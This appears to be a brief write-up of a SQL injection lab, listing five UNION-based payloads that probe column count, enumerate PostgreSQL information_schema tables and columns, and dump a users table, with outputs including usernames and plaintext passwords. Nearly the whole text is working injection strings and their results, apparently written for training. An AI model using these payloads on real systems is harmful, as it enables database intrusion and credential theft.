1. ' UNION SELECT NULL,NULL-- 
2. ' UNION SELECT 'a',NULL-- 
3. ' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
4. ' UNION SELECT TABLE_CATALOG || '~' || TABLE_SCHEMA || '~' || TABLE_NAME || '~' || COLUMN_NAME || '~' || DATA_TYPE, NULL FROM information_schema.columns WHERE table_name = 'users_klrsyl'--
Output:
```
postgres~public~users_klrsyl~password_kjqtws~character varying
postgres~public~users_klrsyl~username_uzufjk~character varying
```

The columns username_uzufjk and password_kjqtws are what we interested in.

5. ' UNION SELECT username_uzufjk || '~' || password_kjqtws, NULL FROM users_klrsyl--

Output:
```
carlos~lhpmvw6k4ty2p5bv2wv6
wiener~vno43qia0i59xbusgnvs
administrator~q1kzx1lcmlukdzdusajw
```